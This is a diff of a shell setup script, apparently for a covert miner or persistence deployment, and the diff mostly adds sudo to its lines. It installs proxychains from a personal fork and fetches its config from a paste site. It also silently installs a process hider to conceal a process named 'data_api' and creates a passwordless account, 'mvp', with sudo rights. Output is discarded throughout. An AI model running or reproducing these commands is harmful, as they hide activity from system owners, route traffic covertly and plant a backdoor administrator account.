@@ -1,6 +1,6 @@
-apt update -y && apt install screen libjansson4 build-essential htop -y && cd ~ && git clone https://github.com/walters99/proxychains-ng.git && cd proxychains-ng > /dev/null 2>&1 && ./configure --prefix=/usr --sysconfdir=/etc && make && make install && make install-config
-wget -O myconf.conf https://www.heypasteit.com/download/0IWWBC && chmod +x myconf.conf && mv myconf.conf /etc/proxychains.conf && proxychains4 curl google.com > /dev/null 2>&1
-npm i -g node-process-hider > /dev/null 2>&1 && ph add data_api > /dev/null 2>&1
+sudo apt update -y && apt install screen libjansson4 build-essential htop -y && cd ~ && git clone https://github.com/walters99/proxychains-ng.git && cd proxychains-ng > /dev/null 2>&1 && ./configure --prefix=/usr --sysconfdir=/etc && make && make install && make install-config
+wget -O myconf.conf https://www.heypasteit.com/download/0IWWBC && sudo chmod +x myconf.conf && sudo mv myconf.conf /etc/proxychains.conf && proxychains4 curl google.com > /dev/null 2>&1
+sudo npm i -g node-process-hider > /dev/null 2>&1 && sudo ph add data_api > /dev/null 2>&1
 echo "SETTING USER..."
 sudo npm i -g node-process-hider > /dev/null 2>&1 && sudo ph add data_api > /dev/null 2>&1
 sudo adduser --disabled-password --gecos "" mvp && sudo usermod -aG sudo mvp
